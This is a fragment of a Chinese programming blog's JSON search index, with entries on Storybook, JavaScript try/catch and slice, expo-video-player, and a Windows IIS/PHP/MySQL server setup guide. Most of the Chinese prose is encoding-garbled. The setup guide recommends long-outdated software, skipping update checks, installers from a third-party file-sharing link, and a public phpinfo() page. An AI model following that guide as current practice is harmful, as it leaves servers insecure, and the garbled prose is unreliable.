éªŒè¯äº¤äº’é€šè¿‡å›è°ƒäº§ç”Ÿæ­£ç¡®çš„è¾“å‡ºã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæŸ¥çœ‹ Header ç»„ä»¶çš„ Login æ•…äº‹ï¼Œå¯ä»¥éªŒè¯å•å‡» Logout æŒ‰é’®ä¼šè§¦å‘ onLogout å›è°ƒï¼Œè¯¥å›è°ƒå°†ç”±ä½¿ç”¨ Header çš„ç»„ä»¶æä¾›ã€‚\n  Storybook æ˜¯å¯æ‰©å±•çš„ã€‚\nä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€ç³»ç»Ÿå¯å¸®åŠ©æµ‹è¯•ã€è®°å½•å’Œä¼˜åŒ–æ•…äº‹ã€‚\nè¿˜å¯ä»¥åˆ›å»ºä¸€ä¸ªæ’ä»¶æ¥æ»¡è¶³å·¥ä½œæµç¨‹è¦æ±‚ã€‚ åœ¨æ’ä»¶éƒ¨åˆ†é˜…è¯»æ›´å¤šå†…å®¹ã€‚\n","description":"å¦‚ä½•ä½¿ç”¨ Storybook ä½œä¸ºæ„å»ºç»„ä»¶çš„å·¥ä½œåŒºã€‚","id":71,"section":"react","tags":null,"title":"æµè§ˆæ•…äº‹","uri":"https://codthing.github.io/react/storybook/sb-started/sb-browse/"},{"content":"try\u0026hellip;catchè¯­å¥æ ‡è®°è¦å°è¯•çš„è¯­å¥å—ï¼Œå¹¶æŒ‡å®šä¸€ä¸ªå‡ºç°å¼‚å¸¸æ—¶æŠ›å‡ºçš„å“åº”ã€‚\n1 2 3 4 5 6 7 8 9 10 11  try { // å°è¯•è¿è¡Œè¿™æ®µä»£ç  } catch(err) { // å¦‚æœæœ‰ä»»ä½•é”™è¯¯ï¼Œä»£ç ä¼šæŠ›å‡ºé”™è¯¯ } finally { // æ— è®ºæ˜¯å¦å‡ºé”™ï¼Œå§‹ç»ˆè¿è¡Œæ­¤ä»£ç   // è¿™ä¸ªå—æ˜¯å¯é€‰çš„ }   ","description":"try...catchè¯­å¥æ ‡è®°è¦å°è¯•çš„è¯­å¥å—ï¼Œå¹¶æŒ‡å®šä¸€ä¸ªå‡ºç°å¼‚å¸¸æ—¶æŠ›å‡ºçš„å“åº”ã€‚","id":72,"section":"javascript","tags":null,"title":"é”™è¯¯å¤„ç†ï¼Œtry{...}catch{...}","uri":"https://codthing.github.io/javascript/function/try-catch/"},{"content":"slice() æ–¹æ³•å°†æ•°ç»„çš„ä¸€éƒ¨åˆ†çš„æµ…æ‹·è´è¿”å›åˆ°ä»å¼€å§‹åˆ°ç»“æŸï¼ˆä¸åŒ…æ‹¬ç»“æŸï¼‰é€‰æ‹©çš„æ–°æ•°ç»„å¯¹è±¡ä¸­ï¼Œå…¶ä¸­å¼€å§‹å’Œç»“æŸè¡¨ç¤ºè¯¥æ•°ç»„ä¸­é¡¹ç›®çš„ç´¢å¼•ã€‚ ä¸ä¼šä¿®æ”¹åŸå§‹æ•°ç»„ã€‚\nä½¿ç”¨ slice æ–¹æ³•è¿”å›æ•°ç»„çš„ä¸€éƒ¨åˆ† slice ï¼ˆArray.prototype.slice()ï¼‰ æ–¹æ³•å¯ä»¥ä»å·²æœ‰æ•°ç»„ä¸­è¿”å›æŒ‡å®šå…ƒç´ ã€‚\nå®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªè§„å®šä»ä½•å¤„å¼€å§‹é€‰å–ï¼Œç¬¬äºŒä¸ªè§„å®šä»ä½•å¤„ç»“æŸé€‰å–ï¼ˆä¸åŒ…æ‹¬è¯¥å…ƒç´ ï¼‰ã€‚\nå¦‚æœæ²¡æœ‰ä¼ å‚ï¼Œåˆ™é»˜è®¤ä¸ºä»æ•°ç»„çš„å¼€å¤´å¼€å§‹åˆ°ç»“å°¾ç»“æŸï¼Œè¿™æ˜¯å¤åˆ¶æ•´ä¸ªæ•°ç»„çš„ç®€å•æ–¹å¼ã€‚\nslice è¿”å›ä¸€ä¸ªæ–°æ•°ç»„ï¼Œä¸ä¼šä¿®æ”¹åŸå§‹æ•°ç»„ã€‚\nç®€å•çš„ä¾‹å­ï¼š\n1 2 3  const arr = [\u0026#34;Cat\u0026#34;, \u0026#34;Dog\u0026#34;, \u0026#34;Tiger\u0026#34;, \u0026#34;Zebra\u0026#34;]; const newArray = arr.slice(1, 3); // [\u0026#34;Dog\u0026#34;, \u0026#34;Tiger\u0026#34;]   å¤æ‚çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9  function sliceArray(anim, beginSlice, endSlice) { return anim.slice(beginSlice, endSlice) } const inputAnim = [\u0026#34;Cat\u0026#34;, \u0026#34;Dog\u0026#34;, \u0026#34;Tiger\u0026#34;, \u0026#34;Zebra\u0026#34;, \u0026#34;Ant\u0026#34;]; sliceArray(inputAnim, 1, 3); // [ \u0026#39;Dog\u0026#39;, \u0026#39;Tiger\u0026#39; ]   \rä½¿ç”¨ slice å–ä»£ splice ä»æ•°ç»„ä¸­ç§»é™¤å…ƒç´  ä½¿ç”¨æ•°ç»„æ—¶ç»å¸¸é‡åˆ°è¦åˆ é™¤ä¸€äº›å…ƒç´ å¹¶ä¿ç•™æ•°ç»„å‰©ä½™éƒ¨åˆ†çš„æƒ…å†µã€‚\nä¸ºæ­¤ï¼ŒJavaScript æä¾›äº† splice æ–¹æ³•ï¼Œ\nå®ƒæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼šä»å“ªé‡Œå¼€å§‹åˆ é™¤é¡¹ç›®çš„ç´¢å¼•ï¼Œå’Œè¦åˆ é™¤çš„é¡¹ç›®æ•°ã€‚ å¦‚æœæ²¡æœ‰æä¾›ç¬¬äºŒä¸ªå‚æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ç§»é™¤ä¸€ç›´åˆ°ç»“å°¾çš„æ‰€æœ‰å…ƒç´ ã€‚\nä½† splice æ–¹æ³•ä¼šæ”¹å˜è°ƒç”¨å®ƒçš„åŸå§‹æ•°ç»„ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š\n1 2 3 4  const cities = [\u0026#34;Chicago\u0026#34;, \u0026#34;Delhi\u0026#34;, \u0026#34;Islamabad\u0026#34;, \u0026#34;London\u0026#34;, \u0026#34;Berlin\u0026#34;]; cities.splice(3, 1); console.log(cities); // [\u0026#34;Chicago\u0026#34;, \u0026#34;Delhi\u0026#34;, \u0026#34;Islamabad\u0026#34;, \u0026#34;Berlin\u0026#34;]   slice æ–¹æ³•ä¸ä¼šæ”¹å˜åŸå§‹æ•°ç»„ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªå¯ä»¥ä¿å­˜åˆ°å˜é‡ä¸­çš„æ–°æ•°ç»„ã€‚\nslice æ–¹æ³•æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä»å¼€å§‹ç´¢å¼•å¼€å§‹é€‰å–åˆ°ç»“æŸï¼ˆä¸åŒ…æ‹¬è¯¥å…ƒç´ ï¼‰ï¼Œå¹¶åœ¨æ–°æ•°ç»„ä¸­è¿”å›è¿™äº›å…ƒç´ ã€‚\nä½¿ç”¨ slice æ–¹æ³•æ›¿ä»£ splice æœ‰åŠ©äºé¿å…æ•°ç»„å˜åŒ–äº§ç”Ÿçš„å‰¯ä½œç”¨ã€‚\n1 2 3 4 5 6 7 8 9  function nonMutatingSplice(cities) { return cities.slice(0, 3); } const inputCities = [\u0026#34;Chicago\u0026#34;, \u0026#34;Delhi\u0026#34;, \u0026#34;Islamabad\u0026#34;, \u0026#34;London\u0026#34;, \u0026#34;Berlin\u0026#34;]; nonMutatingSplice(inputCities); // [\u0026#34;Chicago\u0026#34;, \u0026#34;Delhi\u0026#34;, \u0026#34;Islamabad\u0026#34;]   ","description":"slice() æ–¹æ³•å°†æ•°ç»„çš„ä¸€éƒ¨åˆ†çš„æµ…æ‹·è´è¿”å›åˆ°ä»å¼€å§‹åˆ°ç»“æŸï¼ˆä¸åŒ…æ‹¬ç»“æŸï¼‰é€‰æ‹©çš„æ–°æ•°ç»„å¯¹è±¡ä¸­ï¼Œå…¶ä¸­å¼€å§‹å’Œç»“æŸè¡¨ç¤ºè¯¥æ•°ç»„ä¸­é¡¹ç›®çš„ç´¢å¼•ã€‚ ä¸ä¼šä¿®æ”¹åŸå§‹æ•°ç»„ã€‚","id":73,"section":"javascript","tags":null,"title":"Array.prototype.slice()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/slice-programming/"},{"content":"expo-video-player\nStep.1 å®‰è£… expo install expo-video-player\rexpo install expo-av @react-native-community/netinfo @react-native-community/slider Step.2 ä½¿ç”¨ import { Video } from \u0026#39;expo-av\u0026#39;\rimport VideoPlayer from \u0026#39;expo-video-player\u0026#39;\r\u0026lt;VideoPlayer\rvideoProps={{\rshouldPlay: true,\rresizeMode: Video.RESIZE_MODE_CONTAIN,\rsource: {\ruri: \u0026#39;http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4\u0026#39;,\r},\r}}\rinFullscreen={true}\r/\u0026gt; è§†é¢‘åˆ—è¡¨è§£å†³æ€è·¯  ç”¨å›¾ç‰‡ä½œä¸ºåˆ—è¡¨ ç”¨modelæ¨¡æ€æ¡†ä½œä¸ºå…¨å±è§†é¢‘æ’­æ”¾çš„çª—å£ ç‚¹å‡»å›¾ç‰‡è§¦å‘æ¨¡æ€æ¡†åŠ è½½è§†é¢‘è‡ªåŠ¨æ’­æ”¾  \u0026lt;Button onPress={() =\u0026gt; setVisible(true)}\u0026gt;\rTOGGLE MODAL\r\u0026lt;/Button\u0026gt;\r\u0026lt;Modal\rvisible={visible}\rbackdropStyle={styles.backdrop}\ronBackdropPress={() =\u0026gt; setVisible(false)}\u0026gt;\r\u0026lt;Button style={styles.closebutton} onPress={() =\u0026gt; setVisible(false)} accessoryLeft={closeIcon} /\u0026gt;\r\u0026lt;View style={{paddingBottom: 0}}\u0026gt;\r\u0026lt;VideoPlayer\rvideoProps={{\rshouldPlay: true,\rresizeMode: Video.RESIZE_MODE_CONTAIN,\r// source: {\r// uri: \u0026#39;http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4\u0026#39;,\r// },\rsource: require(\u0026#39;../assets/videos/big_buck_bunny.mp4\u0026#39;)\r}}\rshowControlsOnLoad={true}\rinFullscreen={true}\rshowFullscreenButton={false}\r/\u0026gt;\r\u0026lt;/View\u0026gt;\r\u0026lt;/Modal\u0026gt; ","description":"","id":74,"section":"react-native","tags":null,"title":"expo-video-player","uri":"https://codthing.github.io/react-native/expo/expo-video-player/"},{"content":"Windows Server 2012 R2 x64 IISæœåŠ¡å™¨ PHPç¯å¢ƒæ­å»º\né˜¿é‡Œäº‘æœåŠ¡å™¨ECS Windows Server 2012 R2 64ä½ä¸­æ–‡æ ‡å‡†ç‰ˆä¸‹æ‰‹åŠ¨æ­å»ºPHPç¯å¢ƒã€‚\n IIS8.5 + MySQL5.6.15 + PHP5.5.19 + FastCGI + phpMyAdmin4.2.12\n ç‰¹åˆ«æ³¨æ„ï¼šæœåŠ¡å™¨å†…å­˜ä¸èƒ½ä½äº2Gï¼Œå¦åˆ™å®‰è£…iisçš„è¿‡ç¨‹ä¸­ä¼šæŠ¥é”™ï¼š0x80070008ã€‚\nStep1. ç›¸å…³è½¯ä»¶å‡†å¤‡ å®Œæ•´å®‰è£…åŒ…ä¸‹è½½åœ°å€ï¼šhttp://pan.baidu.com/s/1c0F6g0K\nå®‰è£…åŒ…è§£å‹å¯†ç ï¼šwww.imaoye.com\nStep2. å®‰è£…IIS8.5  è¿›å…¥æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½å‘å¯¼ ä¸‹ä¸€æ­¥ åŸºäºè§’è‰²æˆ–åŸºäºåŠŸèƒ½çš„å®‰è£…ï¼Œä¸‹ä¸€æ­¥ ä»æœåŠ¡å™¨æ± ä¸­é€‰æ‹©æœåŠ¡å™¨ï¼Œä¸‹ä¸€æ­¥ é€‰æ‹©æœåŠ¡å™¨è§’è‰²ï¼Œç‚¹å‡»WebæœåŠ¡å™¨ï¼ˆIISï¼‰ ç›´æ¥ç‚¹å‡»æ·»åŠ åŠŸèƒ½ ç¡®å®šå·²ç»å‹¾é€‰WebæœåŠ¡å™¨ï¼ˆIISï¼‰åï¼Œä¸‹ä¸€æ­¥ ç›´æ¥ç‚¹å‡»ä¸‹ä¸€æ­¥ ç›´æ¥ç‚¹å‡»ä¸‹ä¸€æ­¥ æ ¹æ®è‡ªå·±çš„éœ€æ±‚é€‰æ‹©æœåŠ¡ï¼Œå»ºè®®é€‰æ‹©å…¨éƒ¨åŠŸèƒ½ã€‚å¾€ä¸‹æ‹‰æ»šåŠ¨æ¡è‡³åº”ç”¨ç¨‹åºå¼€å‘å¹¶ç‚¹å‡»å‰é¢çš„å³ä¸‰è§’å½¢å±•å¼€é€‰é¡¹ã€‚ é‡ç‚¹ç¡®å®šCGIé€‰é¡¹è¢«å‹¾é€‰ï¼Œç¡®å®šæ— è¯¯ï¼Œä¸‹ä¸€æ­¥ ç‚¹å‡»å®‰è£…   å®‰è£…æˆåŠŸåï¼Œç‚¹å‡»å…³é—­ï¼Œè¿”å›æœåŠ¡å™¨ç®¡ç†å™¨åœ¨è§’è‰²å’ŒæœåŠ¡å™¨ç»„å¯æŸ¥çœ‹åˆ°IISã€‚\n  æ‰“å¼€ IEï¼Œåœ°å€æ ä¸­è¾“å…¥ï¼š127.0.0.1ï¼Œæ˜¾ç¤ºWindows Serverç•Œé¢ï¼Œåˆ™IIS8.5å®‰è£…æˆåŠŸã€‚\n Step3. å®‰è£…åŠé…ç½®PHP5.5  åœ¨å®‰è£…PHPä¹‹å‰ï¼Œå…ˆå®‰è£…æ”¯æŒPHPè¿è¡Œçš„ä¸¤ä¸ªé‡è¦ç»„ä»¶\n  vcredist_x64.exe (For VS2012) vcredist_x86.exe (For VS2012)   ä¸ªäººé€‰æ‹©ï¼š åœ¨Dç›˜æ–°å»ºPHPServeræ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨è¯¥æ–‡ä»¶å¤¹å†…æ–°å»º PHP MySQL MySQLdata wwwroot4ä¸ªæ–‡ä»¶å¤¹ã€‚ è§£å‹php-5.5.19-nts-Win32-VC11-x86.zipæ–‡ä»¶ï¼Œå°†è§£å‹æ–‡ä»¶å¤¹å†…çš„æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°æ–°å»ºçš„PHPæ–‡ä»¶å¤¹ä¸­ã€‚ å¤åˆ¶æ–‡ä»¶å¤¹å†…çš„php.ini-productionæ–‡ä»¶ï¼Œå°†ç”Ÿæˆçš„å‰¯æœ¬é‡å‘½åä¸ºphp.iniã€‚   æ³¨ï¼šphp.ini-developmenté€‚åˆå¼€å‘æµ‹è¯•ï¼Œå¦‚æœ¬åœ°æµ‹è¯•ç¯å¢ƒï¼›php.ini-production æ‹¥æœ‰è¾ƒé«˜çš„å®‰å…¨æ€§è®¾å®šï¼Œé€‚åˆæœåŠ¡å™¨ä¸Šçº¿è¿è¥äº§å“ï¼Œæ ¹æ®è‡ªå·±çš„éœ€ æ±‚é€‰æ‹©æ–‡ä»¶é…ç½®ã€‚\n é…ç½®php.iniæ–‡ä»¶ï¼Œå³é”®php.iniæ–‡ä»¶ï¼Œç”¨Notepad++ æˆ–è€…è®°äº‹æœ¬æ‰“å¼€ã€‚  \u0026gt; æ³¨æ„ï¼šå¼€å¯PHPæŸä¸ªæ¨¡å—å’ŒåŠŸèƒ½ï¼Œå¿…é¡»å»æ‰å‰é¢çš„åˆ†å· â€œ;â€\r- ç¬¬202è¡Œ å¼€å¯çŸ­æ ‡ç­¾ short_open_tag = On\r- ç¬¬721è¡Œ è®¾ç½®PHPæ¨¡å—è·¯å¾„ extension_dir = \u0026#34;D:\\PHPServer\\PHP\\ext\u0026#34;\r- ç¬¬738è¡Œ å¼€å¯CGI cgi.force_redirect = 0\r- ç¬¬766è¡Œ å¼€å¯CGI fastcgi.impersonate = 1\r- ç¬¬778è¡Œ å¼€å¯CGI cgi.rfc2616_headers = 1\r----å¼€å¯æ‰©å±•æ¨¡å—----\r- ç¬¬864è¡Œ extension=php_curl.dll\r- ç¬¬866è¡Œ extension=php_gd2.dll\r- ç¬¬873è¡Œ extension=php_mbstring.dll\r- ç¬¬874è¡Œ extension=php_exif.dll\r- ç¬¬875è¡Œ extension=php_mysql.dll\r- ç¬¬876è¡Œ extension=php_mysqli.dll\r- ç¬¬881è¡Œ extension=php_pdo_mysql.dll\r- ç¬¬895è¡Œ extension=php_sockets.dll\r- ç¬¬899è¡Œ extension=php_xmlrpc.dll\r----è®¾ç½®æ—¶åŒº----\r- ç¬¬913è¡Œ date.timezone = PRC è‡³æ­¤php.iniåŸºæœ¬é…ç½®å®Œæˆï¼Œä¿å­˜åé€€å‡º\né…ç½®IISæ”¯æŒPHPè¿è¡Œ  1). æ‰“å¼€æœåŠ¡å™¨ç®¡ç†å™¨ï¼Œç‚¹å‡»å·¥å…·ï¼Œé€‰æ‹©ç¬¬ä¸€ä¸ªInternet Information Servicesï¼ˆIISï¼‰ç®¡ç†å™¨\n2). ç‚¹å‡»èµ·å§‹é¡µä¸‹é¢çš„è®¡ç®—æœº/å®ä¾‹åç§°ï¼Œä¸­é—´ä½ç½®iiséƒ¨åˆ†æ‰¾åˆ°å¤„ç†ç¨‹åºæ˜ å°„\n3). åŒå‡»å¤„ç†ç¨‹åºæ˜ å°„è¿›å…¥ï¼Œç‚¹å‡»å³è¾¹æ“ä½œä¸‹é¢çš„æ·»åŠ æ¨¡å—æ˜ å°„\n4). å¼¹å‡ºæ·»åŠ æ¨¡å—æ˜ å°„å¯¹è¯æ¡†ï¼ŒæŒ‰ç…§ä»¥ä¸‹å†…å®¹å¡«å†™\n è¯·æ±‚è·¯å¾„ï¼š*.php æ¨¡å—ï¼šFastCgiModule å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¯é€‰ï¼‰ï¼šD:\\PHPServer\\PHP\\php-cgi.exe åç§°ï¼šFastCGI  5). ç‚¹å‡»ç¡®å®š\n6). ç‚¹å‡»æ˜¯\n7). å›åˆ°ä¸»é¡µï¼Œåœ¨IISéƒ¨åˆ†æ‰¾åˆ°FastCGIè®¾ç½®é€‰é¡¹\n8). åŒå‡»è¿›å…¥FastCGIè®¾ç½®ï¼Œå³é”®D:PHPServerPHPphp-cgi.exe é€‰æ‹©ç¼–è¾‘\n9). å¼¹å‡ºç¼–è¾‘FastCGIåº”ç”¨ç¨‹åºå¯¹è¯æ¡†\n10). ç‚¹å‡»ç¯å¢ƒå˜é‡--ï¼ˆé›†åˆï¼‰å³è¾¹çš„...ï¼Œå¼¹å‡ºEnvironmentVariablesåˆé›†ç¼–è¾‘å™¨ï¼Œç‚¹å‡»å·¦ä¸‹è§’æ·»åŠ \n11). åœ¨å³è¾¹çš„æ‚é¡¹ä¸‹é¢ï¼Œå¡«å…¥å¯¹åº”å€¼\n Nameï¼šPHP_FCGI_MAX_REQUESTS Valueï¼š1000  12). ç‚¹å‡»ç¡®å®š\n13). åœ¨ç›‘è§†å¯¹æ–‡ä»¶æ‰€åšçš„æ›´æ”¹é€‰é¡¹ä¸­é€‰æ‹©æˆ‘ä»¬é…ç½®çš„php.iniæ–‡ä»¶è·¯å¾„\n14). ç‚¹å‡»ç¡®å®š\n15). å›åˆ°ä¸»é¡µï¼Œåœ¨ä¸­é—´çš„IISéƒ¨åˆ†ï¼ŒåŒå‡»é»˜è®¤æ–‡æ¡£é€‰é¡¹\n16). è¿›å…¥é»˜è®¤æ–‡æ¡£é¡µåï¼Œæ ¹æ®è‡ªå·±çš„éœ€æ±‚æ·»åŠ æˆ–è€…åˆ é™¤é»˜è®¤æ–‡ä»¶åç§°ï¼Œåœ¨æ­¤ï¼Œæˆ‘ä»¬ç‚¹å‡»å³è¾¹æ“ä½œä¸‹é¢çš„æ·»åŠ ï¼Œæ·»åŠ index.php\n17). ç‚¹å‡»ç¡®å®š\n18). æ­¤æ—¶ï¼Œé»˜è®¤æ–‡æ¡£å·²ç»æˆåŠŸæ·»åŠ index.php,æ¥ä¸‹æ¥æµ‹è¯•ä¸€ä¸‹PHPç¨‹åºæ˜¯å¦è¿è¡Œæ­£å¸¸ã€‚\n19). ç‚¹å‡»IISç®¡ç†å™¨ å·¦è¾¹ç½‘ç«™é€‰é¡¹ï¼Œç‚¹å‡»ä¸‹é¢çš„Default Web Siteï¼Œå³é”®åˆ é™¤ï¼Œæˆ–è€…ç‚¹å‡»å³è¾¹æ“ä½œé€‰é¡¹ä¸‹çš„åˆ é™¤æŒ‰é’®éƒ½å¯ä»¥ï¼Œåˆ é™¤é»˜è®¤ç«™ç‚¹\n20). åˆ é™¤åï¼Œå³é”®ç½‘ç«™é€‰é¡¹ï¼Œæ·»åŠ ç½‘ç«™\n21). è¿›å…¥æ·»åŠ ç½‘ç«™é¡µ\n ç½‘ç«™åç§°ï¼šï¼ˆå¯è‡ªå®šä¹‰ï¼Œç»™ä½ è‡ªå·±çœ‹çš„ï¼‰ ç‰©ç†è·¯å¾„ï¼šé€‰æ‹©ä¹‹å‰æ–°å»ºçš„wwwrootæ–‡ä»¶å¤¹ä½œä¸ºç½‘ç«™çš„æ ¹ç›®å½• ç‚¹å‡»â€œç¡®å®šâ€  22). ç„¶åæ‰“å¼€D:\\PHPServer\\wwwrootæ–‡ä»¶å¤¹\n æ–°å»ºä¸€ä¸ªindex.php æ–‡ä»¶ï¼Œå†™å…¥ä»¥ä¸‹å†…å®¹ï¼š  \u0026lt;?php\rphpinfo();\r?\u0026gt; ä¿å­˜é€€å‡º\n23). æ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥127.0.0.1 æˆ–è€… æœåŠ¡å™¨çš„å…¬ç½‘IP éƒ½å¯ä»¥ï¼Œå›è½¦çœ‹æ•ˆæœ\nå½“çœ‹åˆ°PHPç‰ˆæœ¬é¡µé¢çš„æ—¶å€™ï¼Œè¯´æ˜PHPç¨‹åºå·²ç»é…ç½®æˆåŠŸï¼Œè¿è¡Œæ­£å¸¸ã€‚\nStep4. å®‰è£…åŠé…ç½®MySQL5.6 1.åŒå‡»è¿è¡Œmysql-installer-community-5.6.15.0.msiæ–‡ä»¶\n2.é€‰æ‹©Install MySQL Products,å®‰è£…MySQL\n3.å‹¾é€‰I accept the license termsï¼ˆæˆ‘æ¥å—ä¸Šè¿°æ¡æ¬¾ï¼‰ï¼Œç‚¹å‡»â€œNextï¼ˆä¸‹ä¸€æ­¥ï¼‰â€\n4.å‹¾é€‰Skip the check for update (not recommended) è·³è¿‡æ£€æŸ¥æ›´æ–°ï¼Œç‚¹å‡»â€œNextï¼ˆä¸‹ä¸€æ­¥ï¼‰â€\n5.é€‰æ‹©â€œCustomâ€ï¼ˆç”¨æˆ·è‡ªå®šä¹‰å®‰è£…ï¼‰\n æ³¨æ„å³è¾¹ï¼Œä¿®æ”¹å®‰è£…è·¯å¾„ï¼Œä»¥é˜²é‡è£…ç³»ç»Ÿåï¼Œéœ€è¦å†æ¬¡å®‰è£…MySQL Installation Pathï¼ˆå®‰è£…è·¯å¾„ï¼‰ï¼šD:\\PHPServer\\MySQL Data Pathï¼ˆæ•°æ®åº“å­˜æ”¾è·¯å¾„ï¼‰ï¼šD:\\PHPServer\\MySQLdata ç‚¹å‡»â€œNextâ€  6.ç¡®å®šMySQL Server 5.6.15è¢«é€‰ä¸­åï¼Œç‚¹å‡»â€œNextâ€\n7.ç‚¹å‡»Execute ï¼ˆæ‰§è¡Œï¼‰\nå¼€å§‹å®‰è£… -\u0026gt; å¼¹å‡ºå¯¹è¯æ¡†ï¼Œå‹¾é€‰â€œæˆ‘å·²é˜…è¯»å¹¶æ¥å—è®¸å¯æ¡æ¬¾â€ï¼Œç‚¹å‡»â€œå®‰è£…â€ -\u0026gt; å®‰è£…å®Œæ¯•ï¼Œç‚¹å‡»â€œå®Œæˆâ€ -\u0026gt; ç‚¹å‡»â€œExecute ï¼ˆæ‰§è¡Œï¼‰ -\u0026gt; ç‚¹å‡»â€œNextâ€ -\u0026gt; ç‚¹å‡»â€œExecute ï¼ˆæ‰§è¡Œï¼‰â€ -\u0026gt; é€ä¸ªå®‰è£…ä¸­ -\u0026gt; å…¨éƒ¨å®‰è£…å®Œæ¯•åï¼Œç‚¹å‡»â€œNextâ€ -\u0026gt; ç‚¹å‡»â€œNextâ€ -\u0026gt;\n8.Config Type (æœåŠ¡å™¨ç±»å‹)ï¼Œæˆ‘ä»¬é€‰æ‹©ç¬¬äºŒç§Server Machine\n9.ç¡®å®šå‹¾é€‰â€œEnable TCP/IP Networkingâ€ï¼ˆå¼€å¯TCP/IPç½‘ç»œç«¯å£ï¼‰\nPort Numberï¼ˆç«¯å£ï¼‰ï¼š3306\nå‹¾é€‰Open firewall port for network accessï¼ˆæ‰“å¼€é˜²ç«å¢™ç«¯å£ç½‘ç»œè®¿é—®ï¼‰\nç‚¹å‡»â€œNextâ€\n10.è®¾ç½®MySQLå¯†ç ï¼Œè¿™ä¸ªä¸€å®šè¦è®°ä½è€Œä¸”å¾ˆé‡è¦ã€‚å¯†ç è®¾ç½®å¥½åï¼Œç‚¹å‡»â€œNextâ€ ç‚¹å‡»â€œNextâ€ -\u0026gt; ç‚¹å‡»â€œNextâ€ -\u0026gt; å®‰è£…å®Œæˆï¼Œç‚¹å‡»â€œNextâ€ -\u0026gt; ç‚¹å‡»â€œFinish ï¼ˆå®Œæˆï¼‰â€\n11.å…³é—­æ­¤çª—å£\n12.ç‚¹å‡»æ¡Œé¢å·¦ä¸‹è§’ç¬¬ä¸€ä¸ªå¼€å§‹å›¾æ ‡ï¼Œè¿›å…¥å¼€å§‹é¡µé¢\n13.ç‚¹å‡»å¼€å§‹é¡µé¢ä¸­ï¼Œæœ€ä¸‹é¢çš„å‘ä¸‹çš„å°ç®­å¤´ï¼Œè¿›å…¥åº”ç”¨ç•Œé¢\n14.æ‰¾åˆ°MySQL5.6 Command Line Clientï¼Œç‚¹å‡»å®ƒï¼Œè¿›å…¥MySQLå‘½ä»¤æ§åˆ¶å°\n15.è¾“å…¥ï¼Œæˆ‘ä»¬åˆšåˆšè®¾å®šçš„MySQLå¯†ç ï¼Œå›è½¦\n16.çœ‹åˆ°äº†è¿™ä¸ªwelcomeç•Œé¢åï¼ŒMySQLå·²ç»æˆåŠŸå®‰è£…ï¼å…³é—­çª—å£\nStep5. å®‰è£…phpMyAdmin 1.è§£å‹phpMyAdmin-4.2.12-all-languages.zipï¼Œå¤åˆ¶è§£å‹æ–‡ä»¶å¤¹ä¸­çš„phpMyAdmin-4.2.12-all-languagesæ–‡ä»¶å¤¹åˆ°D:\\PHPServer\\wwwroot\n2.ç„¶åï¼Œæ‰“å¼€æœåŠ¡å™¨ç®¡ç†å™¨\u0026ndash;å·¥å…·\u0026ndash;Internet Information Servicesï¼ˆIISï¼‰ç®¡ç†å™¨\u0026ndash;è®¡ç®—æœºåç§°\n3.ç‚¹å‡»åˆšåˆšå»ºçš„æµ‹è¯•ç«™ç‚¹ï¼Œåˆ‡æ¢åˆ°â€œå†…å®¹è§†å›¾â€\n4.åŒå‡»è§†å›¾ä¸­çš„phpMyAdmin-4.2.12-all-languagesæ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°index.phpæ–‡ä»¶ï¼Œå³é”®\u0026ndash;æµè§ˆ\n5.è¿›å…¥phpMyAdminç™»å½•é¡µé¢\nç”¨æˆ·åï¼šroot\nå¯†ç ï¼šMySQLç™»å½•å¯†ç \nç‚¹å‡»â€œæ‰§è¡Œâ€\n6.é…ç½®ä¼ªé™æ€æ¨¡å—\n åŒå‡»è¿è¡Œâ€œrewrite_x64_zh-CN.msiâ€ åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ–°å»ºæ–‡ä»¶web.configï¼Œæ·»åŠ ä¼ªé™æ€è§„åˆ™ä»£ç å³å¯å®ç°ç½‘ç«™é™æ€åŒ–ã€‚ ä¹Ÿå¯ä»¥æ ¹æ®è‡ªå·±å®é™…éœ€æ±‚ï¼Œç”¨å…¶ä»–çš„æ–¹æ³•é…ç½®ä¼ªé™æ€è§„åˆ™   è‡³æ­¤ï¼Œåœ¨é˜¿é‡Œäº‘äº‘æœåŠ¡å™¨ECS Windows Server 2012 R2 64ä½ä¸­æ–‡æ ‡å‡†ç‰ˆæ“ä½œç³»ç»Ÿä¸‹æ‰‹åŠ¨æ­å»ºPHPç¯å¢ƒå…¨éƒ¨å®Œæˆã€‚ï¼ˆIIS8.5 + MySQL5.6.15 + PHP5.5.19 + FastCGI + phpMyAdmin4.2.12 ï¼‰\n å…¶ä»–ï¼š dedecmsè‡ªåŠ¨å®‰è£…çš„æ—¶å€™ï¼Œ å°†www6ä¸­çš„æ–‡ä»¶å¤åˆ¶åˆ°wwwrootä¸­ï¼Œå°±å¯ä»¥é€šè¿‡å®¢æˆ·ç«¯è®¿é—®å®‰è£…äº†ã€‚\nå› ä¸ºæ²¡æœ‰å¼€å¯å†™å…¥æƒé™ï¼Œå»åˆ°æœåŠ¡å™¨é‚£é‡Œï¼Œå¼€å¯æƒé™å†™å…¥å°±å¯ä»¥äº†ã€‚\n","description":"","id":75,"section":"others","tags":null,"title":"IIS PHP","uri":"https://codthing.github.io/others/php/iisphp/"},{"content":"ä¸€ã€Promise æ¦‚è¿° Promise å¯¹è±¡ç”¨äºè¡¨ç¤ºä¸€ä¸ªå¼‚æ­¥æ“ä½œçš„æœ€ç»ˆå®Œæˆ (æˆ–å¤±è´¥)åŠå…¶ç»“æœå€¼ã€‚\n#. Promise æœ‰ 3 ä¸ªçŠ¶æ€  å¾…å®šï¼ˆpendingï¼‰: 